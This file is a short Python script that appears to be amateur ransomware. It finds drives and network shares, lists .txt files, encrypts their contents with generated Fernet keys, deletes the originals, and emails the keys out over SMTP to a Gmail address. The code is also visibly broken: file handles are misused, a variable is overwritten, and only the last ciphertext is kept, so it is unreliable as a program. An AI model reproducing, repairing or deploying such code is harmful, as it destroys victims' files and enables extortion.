import subprocess as sub
import cryptography.fernet
import os
import smtplib


def find_drive():
    drive = ["A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "Z:", "N:"]
    sys_drive = []
    cmd = sub.check_output("net share", shell=True)
    for i in drive:
        if i in str(cmd):
            sys_drive.append(i)

    return sys_drive


def find_files(drivers):
    for p in passwand:

        try:
            cmd = sub.check_output("cd / && dir /S /B *." + p, shell=True)
            f.write(cmd)
            print(p)
        except:
            pass

    for d in drivers:
        for p in passwand:

            try:
                cmd = sub.check_output(d + " && dir /S /B *." + p, shell=True)
                f.write(cmd)
                print(d + '-------' + p)
            except:
                pass


passwand = ["txt"]

drivers = find_drive()

f = open("paths.txt", "w")
find_files(drivers)
listkey = []

for i in f:
    f1 = open(i, "r")
    data = f1.read()

    key = cryptography.fernet.Fernet.generate_key()
    f = cryptography.fernet.Fernet(key)
    enc = f.encrypt(data)
    listkey.append(key)

f2 = open('parishack.txt', "r")
f2.write(enc)

for j in find_drive():
    for t in f:
        os.remove(t)


USER = "noone@gmail.com"
PASS = "12345"

FROM = USER
TO = ["any@gmail.com"]

MS = listkey

server = smtplib.SMTP()
server.connect("smtp.gmail.com", 587)
server.starttls()
server.login(USER, PASS)
server.sendmail(FROM, TO, MS)
server.quit()
